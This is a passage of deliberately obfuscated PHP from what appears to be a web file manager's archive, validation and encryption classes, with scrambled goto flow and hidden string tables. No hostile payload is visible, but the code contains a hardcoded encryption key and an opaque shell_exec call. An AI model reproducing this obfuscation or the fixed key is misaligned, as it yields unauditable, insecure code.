$AÉ¥Í¼µÏğ[$F‰¬ÙŠàİ] = $eº³æÅ¦Ôõ[$cèÖËãŠƒô[1306]]; } } else { $Eù¤‰ÁÖĞõ[] = $B©Ïá–œ§Õ; } continue; } $AÉ¥Í¼µÏğ[$F‰¬ÙŠàİ] = $in[$CÜ·¨§¥‘é]; goto dØÁµÒÇğ®; dØÁµÒÇğ®: } goto BˆŸëóª£ï; Dºì¬´ùİ‘: } public static function reg($CäšôÎ¨ô™ = "\x72\x65\x71\x75\151\162\x65") { static $b­Ï„Ş âœ = array("\162\x65\161\165\x69\162\145" => "\56\53", "\156\165\x6d\142\145\162" => "\134\x64\x2b", "\150\x65\170" => "\x5b\60\x2d\71\101\x2d\x46\141\x2d\146\x5d\53", "\151\x6e\x74" => "\x5b\55\134\x2b\x5d\x3f\x5c\144\53", "\142\157\x6f\x6c" => "\60\174\x31", "\x66\x6c\x6f\141\164" => "\x5b\x2d\x5c\x2b\135\77\x5c\144\53\x28\x5c\56\134\144\53\x29\77", "\145\156\x67\x6c\151\163\150" => "\x5b\x41\55\x5a\141\x2d\x7a\40\135\x2b", "\x63\150\151\x6e\145\163\145" => "\x5b\x5c\x78\x7b\64\x65\x30\x30\175\55\134\x78\173\x39\146\141\x35\x7d\135\x2b", "\150\141\163\x43\150\x69\156\x65\163\145" => "\57\x28\133\x5c\170\173\64\145\60\x30\x7d\55\134\170\x7b\71\146\141\x35\175\x5d\x2b\51\57\x75", "\x65\x6d\x61\151\154" => "\x5c\x77\53\x28\133\x5c\x2e\x5c\x2d\135\134\x77\53\51\x2a\x5c\100\x5c\x77\x2b\50\133\134\56\134\x2d\135\x5c\x77\53\x29\52\x5c\56\x5c\x77\x2b", "\x70\x68\x6f\156\145" => "\x31\133\x33\x34\x35\x37\x38\135\134\x64\173\71\175", "\164\x65\x6c\160\x68\157\156\145" => "\50\x5c\50\134\x64\x7b\63\54\x34\x7d\x5c\51\174\x5c\144\173\63\54\64\x7d\x2d\174\x5c\163\x29\x3f\x5c\x64\x7b\x37\54\61\64\x7d", "\x75\x72\154" => "\50\150\x74\x74\x70\174\x66\164\160\174\150\164\164\160\163\x29\x3a\134\57\x5c\57\x5b\x5c\167\134\x2d\x5f\135\x2b\x28\134\56\x5b\134\167\134\x2d\x5f\x5d\x2b\x29\53\x28\133\x5c\167\x5c\x2d\x5c\56\x2c\x40\77\136\x3d\x25\x26\72\134\57\176\134\x2b\43\x5d\x2a\133\x5c\x77\x5c\x2d\134\100\77\136\75\x25\x26\134\x2f\176\x5c\53\43\x5d\x29\77", "\x75\162\154\x46\165\154\x6c" => "\133\141\x2d\x7a\101\x2d\x7a\x5d\x2b\72\x5c\x2f\134\57\133\136\x5c\163\x5d\x2a", "\x69\x70" => "\x28\134\144\x7b\61\x2c\63\175\x5c\x2e\x29\x7b\x33\x7d\50\134\x64\x7b\61\54\x33\x7d\x29", "\172\x69\160" => "\x5b\61\x2d\71\x5d\x5c\x64\173\x35\175\x28\x3f\x21\134\144\x29", "\151\144\x43\x61\162\x64" => "\x28\134\144\x7b\x31\x35\175\x29\x7c\50\x5c\x64\173\61\x37\x7d\50\x5c\x64\174\x58\x7c\170\51\51", "\143\157\x6c\x6f\x72" => "\x23\50\133\x30\x2d\71\101\x2d\106\x61\x2d\146\135\173\63\175\174\133\x30\55\71\101\55\106\141\x2d\146\x5d\173\66\x7d\51", "\x74\151\x6d\145" => "\50\x5b\x30\55\x31\135\134\x64\x7c\x32\133\60\x2d\x34\x5d\51\72\x5b\x30\55\65\x5d\134\x64", "\144\x61\x74\x65" => "\x5c\144\173\64\175\133\x2d\134\57\x5d\77\x28\x30\133\61\55\71\135\174\61\x5b\60\x2d\x32\x5d\x29\133\x2d\134\x2f\x5d\77\50\x5b\x30\x2d\62\135\x5c\x64\174\63\133\x30\x2d\61\x5d\51", "\x64\x61\164\x65\x54\x69\155\145" => "\x5c\144\173\64\x7d\133\x2d\134\x2f\x5d\x3f\50\x30\x5b\61\55\71\135\x7c\x31\133\60\55\62\x5d\x29\x5b\x2d\134\57\135\x3f\50\x5b\x30\55\62\135\x5c\144\174\x33\x5b\x30\x2d\x31\135\x29\134\x73\x2b\x28\133\60\55\61\x5d\134\x64\x7c\62\133\x30\x2d\x34\135\51\72\133\60\55\65\135\x5c\x64", "\160\141\163\x73\167\157\x72\144" => "\x28\x3f\x3d\x2e\52\134\x64\51\50\77\x3d\x2e\x2a\x5b\141\55\x7a\x5d\x29\x28\77\x3d\x2e\x2a\x5b\101\55\x5a\x5d\x29\56\x7b\x38\54\x32\60\x7d", "\153\x65\171" => "\x5b\101\55\x5a\x61\55\x7a\x30\55\71\137\x5c\55\x5c\x2e\135\x2b", "\x6b\x65\x79\106\x75\x6c\154" => "\x5b\x41\55\x5a\x61\x2d\x7a\x30\55\71\x5f\134\55\134\x2e\x5c\x73\54\x5d\x2b"); if (!$CäšôÎ¨ô™) { return $b­Ï„Ş âœ; } return $b­Ï„Ş âœ[$CäšôÎ¨ô™]; } public static function check($Bš–‡ë¯“, $E¾äæÁç˜É, $B¯ƒÑÄª“Å = null) { $c•ˆë·÷¡Ü =& $_SERVER[İë¬“ÅÒÛ›]; switch ($E¾äæÁç˜É) { case $c•ˆë·÷¡Ü[7]: return in_array($Bš–‡ë¯“, $B¯ƒÑÄª“Å); break; case $c•ˆë·÷¡Ü[1309]: return floatval($Bš–‡ë¯“) > $B¯ƒÑÄª“Å; break; case $c•ˆë·÷¡Ü[1310]: return floatval($Bš–‡ë¯“) < $B¯ƒÑÄª“Å; break; case $c•ˆë·÷¡Ü[329]: return strlen($Bš–‡ë¯“) >= $B¯ƒÑÄª“Å[0] && strlen($Bš–‡ë¯“) <= $B¯ƒÑÄª“Å[1]; break; case $c•ˆë·÷¡Ü[329]: if (is_array($B¯ƒÑÄª“Å)) { return strlen($Bš–‡ë¯“) >= $B¯ƒÑÄª“Å[0] && strlen($Bš–‡ë¯“) <= $B¯ƒÑÄª“Å[1]; break; } else { return strlen($Bš–‡ë¯“) == $B¯ƒÑÄª“Å; break; } case $c•ˆë·÷¡Ü[325]: return floatval($Bš–‡ë¯“) >= $B¯ƒÑÄª“Å[0] && floatval($Bš–‡ë¯“) <= $B¯ƒÑÄª“Å[1]; break; } $aó­„Ï‡ŒÏ = self::reg(!1); $E¾äæÁç˜É = isset($aó­„Ï‡ŒÏ[$E¾äæÁç˜É]) ? $aó­„Ï‡ŒÏ[$E¾äæÁç˜É] : $E¾äæÁç˜É; if (substr($E¾äæÁç˜É, 0, 1) != $c•ˆë·÷¡Ü[8]) { $E¾äæÁç˜É = $c•ˆë·÷¡Ü[1311] . $E¾äæÁç˜É . $c•ˆë·÷¡Ü[1312]; } return preg_match($E¾äæÁç˜É, $Bš–‡ë¯“) === 1; } public static function get($DœÕ¾ÜÅ«Ì, $dµä²ñŞ ° = null, $D¡æ„Ø¤öÏ = null, $böÎ­ôÏ‘™ = null) { goto Eòñ˜å±Ó–; DĞè¬Í°×: return $fİÏ§Ì¶¦Œ[$DœÕ¾ÜÅ«Ì]; goto A¨¼¹ÙŠ—­; Eòñ˜å±Ó–: $DÀĞ°™‚†¦ =& $_SERVER[İë¬“ÅÒÛ›]; $D²ø®µÃÃ = array(); if (!is_null($D¡æ„Ø¤öÏ)) { $D²ø®µÃÃ[$DÀĞ°™‚†¦[34]] = $D¡æ„Ø¤öÏ; } goto E‹š¹£ñ­î; E‹š¹£ñ­î: if (!is_null($böÎ­ôÏ‘™)) { $D²ø®µÃÃ[$DÀĞ°™‚†¦[760]] = $böÎ­ôÏ‘™; } if (!is_null($dµä²ñŞ °)) { $D²ø®µÃÃ[$DÀĞ°™‚†¦[1307]] = $dµä²ñŞ °; } $fİÏ§Ì¶¦Œ = Input::getArray(array($DœÕ¾ÜÅ«Ì => $D²ø®µÃÃ)); goto DĞè¬Í°×; A¨¼¹ÙŠ—­: } } class KodArchive { static function init() { goto D­²ëÖ©®; d˜ÒÀ»î‡•: require_once ARCHIVE_LIB . $eƒÒ´ß¼ÍË[1321]; require_once ARCHIVE_LIB . $eƒÒ´ß¼ÍË[1322]; require_once ARCHIVE_LIB . $eƒÒ´ß¼ÍË[1323]; goto A”–Ëë ò; A”–Ëë ò: require_once ARCHIVE_LIB . $eƒÒ´ß¼ÍË[1324]; goto CŒÖôò­†¾; D­²ëÖ©®: $eƒÒ´ß¼ÍË =& $_SERVER[İë¬“ÅÒÛ›]; if (defined($eƒÒ´ß¼ÍË[1313])) { return; } define($eƒÒ´ß¼ÍË[1313], SDK_DIR . $eƒÒ´ß¼ÍË[1314]); goto a…Õå³Íö; EîÎ·Ù²¦: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $eƒÒ´ß¼ÍË[1319]; require_once ARCHIVE_LIB . $eƒÒ´ß¼ÍË[1320]; goto d˜ÒÀ»î‡•; a…Õå³Íö: define($eƒÒ´ß¼ÍË[1315], TEMP_FILES); define($eƒÒ´ß¼ÍË[1316], TEMP_FILES); define($eƒÒ´ß¼ÍË[1317], $eƒÒ´ß¼ÍË[1318]); goto EîÎ·Ù²¦; CŒÖôò­†¾: } static function checkIfType($Aãˆ‰¦Ï‰¸, $CØÁ‘‡·¤) { goto B‰…Ø•¿Şµ; CÈ„Ÿ‹‘™³: return $eİšô±—Ÿ; goto A‘ë÷•ßÊ; dñ½Ñê…ÉÎ: $eİšô±—Ÿ = in_array($Aãˆ‰¦Ï‰¸, $cÏ©Ó’Ÿ±Ñ[$CØÁ‘‡·¤]); if ($eİšô±—Ÿ && ($CØÁ‘‡·¤ == $AŞ·å‚„Å–[305] || $CØÁ‘‡·¤ == $AŞ·å‚„Å–[1328]) && (!function_exists($AŞ·å‚„Å–[1338]) || !function_exists($AŞ·å‚„Å–[1339]))) { show_tips($AŞ·å‚„Å–[1340]); } if ($eİšô±—Ÿ && $CØÁ‘‡·¤ == $AŞ·å‚„Å–[796] && (!function_exists($AŞ·å‚„Å–[1341]) || !strstr(shell_exec($AŞ·å‚„Å–[1342]), $AŞ·å‚„Å–[1343]))) { show_tips($AŞ·å‚„Å–[1344]); } goto CÈ„Ÿ‹‘™³; B‰…Ø•¿Şµ: $AŞ·å‚„Å– =& $_SERVER[İë¬“ÅÒÛ›]; self::init(); $cÏ©Ó’Ÿ±Ñ = array($AŞ·å‚„Å–[305] => array($AŞ·å‚„Å–[305], $AŞ·å‚„Å–[1325], $AŞ·å‚„Å–[1326], $AŞ·å‚„Å–[1327]), $AŞ·å‚„Å–[1328] => array($AŞ·å‚„Å–[1328], $AŞ·å‚„Å–[1329], $AŞ·å‚„Å–[1330], $AŞ·å‚„Å–[1331]), $AŞ·å‚„Å–[796] => array($AŞ·å‚„Å–[796], $AŞ·å‚„Å–[1332], $AŞ·å‚„Å–[1333], $AŞ·å‚„Å–[1334], $AŞ·å‚„Å–[1335], $AŞ·å‚„Å–[1336], $AŞ·å‚„Å–[1337])); goto dñ½Ñê…ÉÎ; A‘ë÷•ßÊ: } static function listContent($FÎĞƒ„µ™, $CĞèĞ¥ÈÌå = true) { $BÈ©â›¯Ã‘ =& $_SERVER[İë¬“ÅÒÛ›]; self::init(); $E«’‚æğ¿ó = $GLOBALS[$BÈ©â›¯Ã‘[797]] ? $GLOBALS[$BÈ©â›¯Ã‘[797]] : get_path_ext($FÎĞƒ„µ™); $Eö›‹—ŒÁÄ = !1; if (self::checkIfType($E«’‚æğ¿ó, $BÈ©â›¯Ã‘[1328])) { $fÙğ»‰Íë = PclTarList($FÎĞƒ„µ™, $E«’‚æğ¿ó); $Eö›‹—ŒÁÄ = array(); for ($Cí‘ªŞŞÚ‘ = 0; $Cí‘ªŞŞÚ‘ < count($fÙğ»‰Íë); $Cí‘ªŞŞÚ‘++) { $a¦éÍ…‘í = $fÙğ»‰Íë[$Cí‘ªŞŞÚ‘]; if ($a¦éÍ…‘í[$BÈ©â›¯Ã‘[1345]] == $BÈ©â›¯Ã‘[1346] || $a¦éÍ…‘í[$BÈ©â›¯Ã‘[1345]] == $BÈ©â›¯Ã‘[1347]) { continue; } if ($CĞèĞ¥ÈÌå) { $a¦éÍ…‘í[$BÈ©â›¯Ã‘[1348]] = ltrim($a¦éÍ…‘í[$BÈ©â›¯Ã‘[1348]], $BÈ©â›¯Ã‘[891]); } if ($a¦éÍ…‘í[$BÈ©â›¯Ã‘[1345]] == $BÈ©â›¯Ã‘[1349]) { $a¦éÍ…‘í[$BÈ©â›¯Ã‘[77]] = !0; } else { $a¦éÍ…‘í[$BÈ©â›¯Ã‘[77]] = !1; } $a¦éÍ…‘í[$BÈ©â›¯Ã‘[788]] = $Cí‘ªŞŞÚ‘; $Eö›‹—ŒÁÄ[] = $a¦éÍ…‘í; } } else { if (self::checkIfType($E«’‚æğ¿ó, $BÈ©â›¯Ã‘[796])) { $Eª“Í‹½¡ = kodRarArchive::listContent($FÎĞƒ„µ™); if (!$Eª“Í‹½¡[$BÈ©â›¯Ã‘[784]]) { return $Eª“Í‹½¡; } else { $Eö›‹—ŒÁÄ = $Eª“Í‹½¡[$BÈ©â›¯Ã‘[786]]; } } else { if (kodZipArchive::support($BÈ©â›¯Ã‘[357])) { $Eö›‹—ŒÁÄ = kodZipArchive::listContent($FÎĞƒ„µ™); } else { $c‘Ò±ˆĞç = new PclZip($FÎĞƒ„µ™); $Eö›‹—ŒÁÄ = $c‘Ò±ˆĞç->listContent(); } } } if ($Eö›‹—ŒÁÄ) { $B“§¶ê†² = unzip_charset_get($Eö›‹—ŒÁÄ); $CĞèĞ¥ÈÌå = $CĞèĞ¥ÈÌå && function_exists($BÈ©â›¯Ã‘[66]); for ($Cí‘ªŞŞÚ‘ = 0; $Cí‘ªŞŞÚ‘ < count($Eö›‹—ŒÁÄ); $Cí‘ªŞŞÚ‘++) { $Eö›‹—ŒÁÄ[$Cí‘ªŞŞÚ‘][$BÈ©â›¯Ã‘[1348]] = str_replace(array($BÈ©â›¯Ã‘[821], $BÈ©â›¯Ã‘[1350]), $BÈ©â›¯Ã‘[531], $Eö›‹—ŒÁÄ[$Cí‘ªŞŞÚ‘][$BÈ©â›¯Ã‘[1348]]); if ($CĞèĞ¥ÈÌå) { $Eö›‹—ŒÁÄ[$Cí‘ªŞŞÚ‘][$BÈ©â›¯Ã‘[1348]] = iconv_to($Eö›‹—ŒÁÄ[$Cí‘ªŞŞÚ‘][$BÈ©â›¯Ã‘[1348]], $B“§¶ê†², $BÈ©â›¯Ã‘[330]); unset($Eö›‹—ŒÁÄ[$Cí‘ªŞŞÚ‘][$BÈ©â›¯Ã‘[1351]]); } } return array($BÈ©â›¯Ã‘[784] => !0, $BÈ©â›¯Ã‘[786] => $Eö›‹—ŒÁÄ); } else { return array($BÈ©â›¯Ã‘[784] => !1, $BÈ©â›¯Ã‘[786] => $Eö›‹—ŒÁÄ); } } static function extract($bå©¢ë½¿ñ, $fï˜¸Ôˆå, $AÉ°­À™º“ = "\x2d\x31", &$Fƒµ†ÙîÂ = false) { goto fåí™Éƒ¦è; e”—Û°Šöß: $AÕ›É¯Ã¨Š = self::listContent($bå©¢ë½¿ñ, !1); if (!$AÕ›É¯Ã¨Š[$E§ºá„¡ß[784]]) { return $AÕ›É¯Ã¨Š; } if ($AÉ°­À™º“ != $E§ºá„¡ß[783]) { goto E†¦²°Ò¤Ò; AâÀÏ¶‹°Ò: if ($GLOBALS[$E§ºá„¡ß[6]][$E§ºá„¡ß[889]] != $E§ºá„¡ß[330]) { $b¢öÇ£¥Ñª = unzip_pre_name($Fƒµ†ÙîÂ); } $BãƒíêíğŠ = get_path_father($Fƒµ†ÙîÂ); if ($BãƒíêíğŠ == $Fƒµ†ÙîÂ) { $BãƒíêíğŠ = $E§ºá„¡ß[33]; } goto a¬—­Æö•‘; E†¦²°Ò¤Ò: $Aò ™­‹ƒ˜ = self::fileIndex($AÕ›É¯Ã¨Š[$E§ºá„¡ß[786]], $AÉ°­À™º“); $Fƒµ†ÙîÂ = str_replace(array($E§ºá„¡ß[821], $E§ºá„¡ß[1350]), $E§ºá„¡ß[71], $Aò ™­‹ƒ˜[$E§ºá„¡ß[1348]]); $b¢öÇ£¥Ñª = $Fƒµ†ÙîÂ; goto AâÀÏ¶‹°Ò; a¬—­Æö•‘: if ($Aò ™­‹ƒ˜[$E§ºá„¡ß[77]]) { $b¢öÇ£¥Ñª = rtrim($b¢öÇ£¥Ñª, $E§ºá„¡ß[8]) . $E§ºá„¡ß[8]; $Fƒµ†ÙîÂ = array($Fƒµ†ÙîÂ); } $CˆÉˆ‡Ã®± = str_replace($E§ºá„¡ß[94], $E§ºá„¡ß[8], $b¢öÇ£¥Ñª); if (substr($CˆÉˆ‡Ã®±, -1) == $E§ºá„¡ß[8]) { if (!strstr(trim($CˆÉˆ‡Ã®±, $E§ºá„¡ß[8]), $E§ºá„¡ß[8])) { $fï˜¸Ôˆå = $fï˜¸Ôˆå . get_path_this($CˆÉˆ‡Ã®±) . $E§ºá„¡ß[8]; } } else { if ($BãƒíêíğŠ == $b¢öÇ£¥Ñª) { $BãƒíêíğŠ = $E§ºá„¡ß[33]; } } goto cÊé¡”ÀÂ×; cÊé¡”ÀÂ×: } goto CÃÛ‚‘¦; fåí™Éƒ¦è: $E§ºá„¡ß =& $_SERVER[İë¬“ÅÒÛ›]; self::init(); $Cß£Ù±Ä‡ = $GLOBALS[$E§ºá„¡ß[797]] ? $GLOBALS[$E§ºá„¡ß[797]] : get_path_ext($bå©¢ë½¿ñ); goto e”—Û°Šöß; CÃÛ‚‘¦: if (self::checkIfType($Cß£Ù±Ä‡, $E§ºá„¡ß[1328])) { if ($AÉ°­À™º“ != $E§ºá„¡ß[783]) { $b¢öÇ£¥Ñª = unzip_pre_name($b¢öÇ£¥Ñª); $BãƒíêíğŠ = unzip_pre_name($BãƒíêíğŠ); $C˜…–¹´› = PclTarExtractList($bå©¢ë½¿ñ, array($b¢öÇ£¥Ñª), $fï˜¸Ôˆå, $BãƒíêíğŠ, $Cß£Ù±Ä‡); } else { $C˜…–¹´› = PclTarExtract($bå©¢ë½¿ñ, $fï˜¸Ôˆå, $E§ºá„¡ß[364], $Cß£Ù±Ä‡); } return array($E§ºá„¡ß[784] => $C˜…–¹´›, $E§ºá„¡ß[786] => PclErrorString(!0)); } else { if (self::checkIfType($Cß£Ù±Ä‡, $E§ºá„¡ß[796])) { return kodRarArchive::extract($bå©¢ë½¿ñ, $fï˜¸Ôˆå, $Cß£Ù±Ä‡, $Fƒµ†ÙîÂ); } else { if (kodZipArchive::support($E§ºá„¡ß[1352])) { return kodZipArchive::extract($bå©¢ë½¿ñ, $fï˜¸Ôˆå, $Fƒµ†ÙîÂ); } else { $d©àµß¶Ç¶ = new PclZip($bå©¢ë½¿ñ); if ($AÉ°­À™º“ != $E§ºá„¡ß[783]) { $C˜…–¹´› = $d©àµß¶Ç¶->extract(PCLZIP_OPT_PATH, $fï˜¸Ôˆå, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $E§ºá„¡ß[1353], PCLZIP_OPT_BY_NAME, $Aò ™­‹ƒ˜[$E§ºá„¡ß[1348]], PCLZIP_OPT_REMOVE_PATH, $BãƒíêíğŠ, PCLZIP_OPT_REPLACE_NEWER); } else { $C˜…–¹´› = $d©àµß¶Ç¶->extract(PCLZIP_OPT_PATH, $fï˜¸Ôˆå, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $E§ºá„¡ß[1353], PCLZIP_OPT_REPLACE_NEWER); } return array($E§ºá„¡ß[784] => $C˜…–¹´›, $E§ºá„¡ß[786] => $d©àµß¶Ç¶->errorName(!0)); } } } return array($E§ºá„¡ß[784] => !1, $E§ºá„¡ß[786] => $E§ºá„¡ß[1354]); goto Cƒ•·î¸İ®; Cƒ•·î¸İ®: } static function fileIndex($c­¸ÆÂôá, $Fƒ¶‰Á¹Ç, $D—¬ö…—õĞ = false) { goto eãŸ·Ÿ…è˜; eãŸ·Ÿ…è˜: $bÀ×îÑÓÒ =& $_SERVER[İë¬“ÅÒÛ›]; self::init(); if (!is_array($c­¸ÆÂôá)) { return !1; } goto A¤ùæİğĞ; dœë¥È´Ù”: $Däƒ„õ«“» = $Dè¥¤·”ß; if ($D—¬ö…—õĞ) { $Däƒ„õ«“» = $Dè¥¤·”ß[$D—¬ö…—õĞ]; if ($Dè¥¤·”ß[$bÀ×îÑÓÒ[77]]) { $Däƒ„õ«“» = rtrim($Däƒ„õ«“», $bÀ×îÑÓÒ[8]) . $bÀ×îÑÓÒ[8]; } } return $Däƒ„õ«“»; goto e¼Ë´Á‹ìÀ; A¤ùæİğĞ: $Cé”Œº›ô  = count($c­¸ÆÂôá); for ($bƒàÍÂÜ§† = 0; $bƒàÍÂÜ§† < $Cé”Œº›ô ; $bƒàÍÂÜ§†++) { if ($Fƒ¶‰Á¹Ç == $c­¸ÆÂôá[$bƒàÍÂÜ§†][$bÀ×îÑÓÒ[788]]) { $Dè¥¤·”ß = $c­¸ÆÂôá[$bƒàÍÂÜ§†]; break; } } if (!$Dè¥¤·”ß) { show_tips($bÀ×îÑÓÒ[1355]); } goto dœë¥È´Ù”; e¼Ë´Á‹ìÀ: } static function extractZipFile($AÊ…À³Ù, $aêò‹¼õë¤, $f‘ÕÄª£¯‚ = false) { goto D¦‘’™”Ş†; bÊÍßìÓ™à: if (file_exists($dçÜ÷ÆË)) { return $dçÜ÷ÆË; } $F÷Œ—ñ¢õª = new PclZip($AÊ…À³Ù); $d»ÌîòŠ† = unzip_filter_ext($b‰¨ÎÚéö . get_path_this($aêò‹¼õë¤)); goto FÂåøëœ·¯; FÂåøëœ·¯: $Dïšİ¬ğÄÓ = get_path_father($aêò‹¼õë¤); if ($Dïšİ¬ğÄÓ == $aêò‹¼õë¤) { $Dïšİ¬ğÄÓ = $e¹ëùó¡“Ğ[33]; } $aÒ‰äÄàå = $F÷Œ—ñ¢õª->extract(PCLZIP_OPT_PATH, $b‰¨ÎÚéö, PCLZIP_CB_PRE_FILE_NAME, $e¹ëùó¡“Ğ[1353], PCLZIP_OPT_REMOVE_PATH, $Dïšİ¬ğÄÓ, PCLZIP_OPT_BY_NAME, $aêò‹¼õë¤); goto e‘ÇĞÚâ”¼; e‘ÇĞÚâ”¼: if (!file_exists($d»ÌîòŠ†)) { return !1; } @rename($d»ÌîòŠ†, $dçÜ÷ÆË); return $dçÜ÷ÆË; goto eÃ©‹¸¼Ä»; bŠ´Ğ»¥Ê¿: mk_dir($b‰¨ÎÚéö); $dçÜ÷ÆË = $b‰¨ÎÚéö . md5($AÊ…À³Ù . $aêò‹¼õë¤); if ($f‘ÕÄª£¯‚) { $dçÜ÷ÆË = $b‰¨ÎÚéö . $f‘ÕÄª£¯‚; } goto bÊÍßìÓ™à; D¦‘’™”Ş†: $e¹ëùó¡“Ğ =& $_SERVER[İë¬“ÅÒÛ›]; self::init(); $b‰¨ÎÚéö = TEMP_FILES . hash_path($AÊ…À³Ù) . $e¹ëùó¡“Ğ[8]; goto bŠ´Ğ»¥Ê¿; eÃ©‹¸¼Ä»: } static function filePreview($e»à¸¨åÇ, $dÏß‹ÂÁœƒ, $D‡ä¨§Ò‡ = false, $b ß™”ƒëÅ = false) { goto DÜî†ë®ë; C˜’ˆ× ¯: mk_dir($E©ÈƒÈ”ÍÊ); $bÓ¾ÚíÚâ = $E©ÈƒÈ”ÍÊ . md5($e»à¸¨åÇ . $dÏß‹ÂÁœƒ . $b ß™”ƒëÅ); $FîíÌ¯ˆ§ = $dÚÊ±´ÆÚä[33]; goto c×›ƒÍ°©ù; c×›ƒÍ°©ù: $BÈ­–¸îøà = self::extract($e»à¸¨åÇ, $E©ÈƒÈ”ÍÊ, $dÏß‹ÂÁœƒ, $FîíÌ¯ˆ§); if (is_array($FîíÌ¯ˆ§)) { show_json($dÚÊ±´ÆÚä[1356], !1); } if (file_exists($bÓ¾ÚíÚâ)) { IO::fileOut($bÓ¾ÚíÚâ, $D‡ä¨§Ò‡, get_path_this($FîíÌ¯ˆ§)); return; } goto EÄç¿¤¦ºĞ; DÜî†ë®ë: $dÚÊ±´ÆÚä =& $_SERVER[İë¬“ÅÒÛ›]; self::init(); $E©ÈƒÈ”ÍÊ = TEMP_FILES . hash_path($e»à¸¨åÇ) . $dÚÊ±´ÆÚä[8]; goto C˜’ˆ× ¯; EÄç¿¤¦ºĞ: $FîíÌ¯ˆ§ = unzip_pre_name($FîíÌ¯ˆ§); $c¼Ì›±á¤ = get_path_this($FîíÌ¯ˆ§); $d»“àí¾©¦ = unzip_filter_ext($E©ÈƒÈ”ÍÊ . $c¼Ì›±á¤); goto fİ¯Òè„İª; a³ª”¤ù: if (!file_exists($bÓ¾ÚíÚâ)) { del_dir($E©ÈƒÈ”ÍÊ); show_json($dÚÊ±´ÆÚä[1358]); } IO::fileOut($bÓ¾ÚíÚâ, $D‡ä¨§Ò‡, $c¼Ì›±á¤); goto Aç‰Â„²Œ; fİ¯Òè„İª: if (!$BÈ­–¸îøà[$dÚÊ±´ÆÚä[784]]) { show_json($BÈ­–¸îøà[$dÚÊ±´ÆÚä[786]], !1); } if (!file_exists($d»“àí¾©¦)) { show_json($dÚÊ±´ÆÚä[1357], !1); } @rename($d»“àí¾©¦, $bÓ¾ÚíÚâ); goto a³ª”¤ù; Aç‰Â„²Œ: } static function create($D±Ò±İŒˆâ, $Bˆöìë³ïĞ) { $F¶çÆ‚ªÒÙ =& $_SERVER[İë¬“ÅÒÛ›]; self::init(); $eªğ¶ÆÇÏ = get_path_ext($D±Ò±İŒˆâ); $d¤Ñœ¦“ë = !1; if (self::checkIfType($eªğ¶ÆÇÏ, $F¶çÆ‚ªÒÙ[305])) { if (kodZipArchive::support($F¶çÆ‚ªÒÙ[759])) { return kodZipArchive::create($D±Ò±İŒˆâ, $Bˆöìë³ïĞ); } $E©Ÿ÷óó×” = new PclZip($D±Ò±İŒˆâ); foreach ($Bˆöìë³ïĞ as $E¢Ù¯‡¡ˆå => $aÑ››™«í) { $aÑ››™«í = str_replace($F¶çÆ‚ªÒÙ[1359], $F¶çÆ‚ªÒÙ[8], $aÑ››™«í); $FÆ‘øµ††µ = Kodio::clear(get_path_father($aÑ››™«í)); if ($E¢Ù¯‡¡ˆå == 0) { $d¤Ñœ¦“ë = $E©Ÿ÷óó×”->create($aÑ››™«í, PCLZIP_OPT_REMOVE_PATH, $FÆ‘øµ††µ, PCLZIP_CB_PRE_FILE_NAME, $F¶çÆ‚ªÒÙ[1360]); continue; } $d¤Ñœ¦“ë = $E©Ÿ÷óó×”->add($aÑ››™«í, PCLZIP_OPT_REMOVE_PATH, $FÆ‘øµ††µ, PCLZIP_CB_PRE_FILE_NAME, $F¶çÆ‚ªÒÙ[1360]); } } else { if (self::checkIfType($eªğ¶ÆÇÏ, $F¶çÆ‚ªÒÙ[1328])) { foreach ($Bˆöìë³ïĞ as $E¢Ù¯‡¡ˆå => $aÑ››™«í) { $aÑ››™«í = str_replace($F¶çÆ‚ªÒÙ[1359], $F¶çÆ‚ªÒÙ[8], $aÑ››™«í); $FÆ‘øµ††µ = Kodio::clear(get_path_father($aÑ››™«í)); if ($E¢Ù¯‡¡ˆå == 0) { $d¤Ñœ¦“ë = PclTarCreate($D±Ò±İŒˆâ, array($aÑ››™«í), $eªğ¶ÆÇÏ, null, $FÆ‘øµ††µ); continue; } $d¤Ñœ¦“ë = PclTarAddList($D±Ò±İŒˆâ, array($aÑ››™«í), $F¶çÆ‚ªÒÙ[33], $FÆ‘øµ††µ, $eªğ¶ÆÇÏ); } } } return $d¤Ñœ¦“ë; } } class Mcrypt { public static $defaultKey = "\x61\x21\164\141\x6b\x41\72\x64\154\155\143\154\x64\105\x76\x2c\x65"; public static function encode($e‘ÀÙº š, $bÅÄº©„ = '', $d—Ä…¿ï· = 0) { goto EâªÚæáØÓ; FÏÆÆİí¨‡: $bö¤ó¦èÜ = strlen($e‘ÀÙº š); $DãôÚ‘ì†Â = array(); for ($bÍÚ©Ì±šÍ = 0; $bÍÚ©Ì±šÍ <= 255; $bÍÚ©Ì±šÍ++) { $DãôÚ‘ì†Â[$bÍÚ©Ì±šÍ] = ord($D—·…®ºå[$bÍÚ©Ì±šÍ % $dáïéÈ†í]); } goto BÓÁÆïŒ³Š; a™œÎê‚“: for ($CƒÍ¯ÓâØ = $b«·Ø–ì« = $bÍÚ©Ì±šÍ = 0; $bÍÚ©Ì±šÍ < $bö¤ó¦èÜ; $bÍÚ©Ì±šÍ++) { $CƒÍ¯ÓâØ = ($CƒÍ¯ÓâØ + 1) % 256; $b«·Ø–ì« = ($b«·Ø–ì« + $DÅŞµçƒªƒ[$CƒÍ¯ÓâØ]) % 256; $E’»ÚÀ»Ÿ¤ = $DÅŞµçƒªƒ[$CƒÍ¯ÓâØ]; $DÅŞµçƒªƒ[$CƒÍ¯ÓâØ] = $DÅŞµçƒªƒ[$b«·Ø–ì«]; $DÅŞµçƒªƒ[$b«·Ø–ì«] = $E’»ÚÀ»Ÿ¤; $f¶Ú·æ…×» .= chr(ord($e‘ÀÙº š[$bÍÚ©Ì±šÍ]) ^ $DÅŞµçƒªƒ[($DÅŞµçƒªƒ[$CƒÍ¯ÓâØ] + $DÅŞµçƒªƒ[$b«·Ø–ì«]) % 256]); } $f¶Ú·æ…×» = $déÆ¶ª²±® . str_replace($aç”µ¨Ğ[677], $aç”µ¨Ğ[33], base64_encode($f¶Ú·æ…×»)); $f¶Ú·æ…×» = str_replace(array($aç”µ¨Ğ[288], $aç”µ¨Ğ[8], $aç”µ¨Ğ[677]), array($aç”µ¨Ğ[499], $aç”µ¨Ğ[71], $aç”µ¨Ğ[92]), $f¶Ú·æ…×»); goto aÔøë‘Éñ; 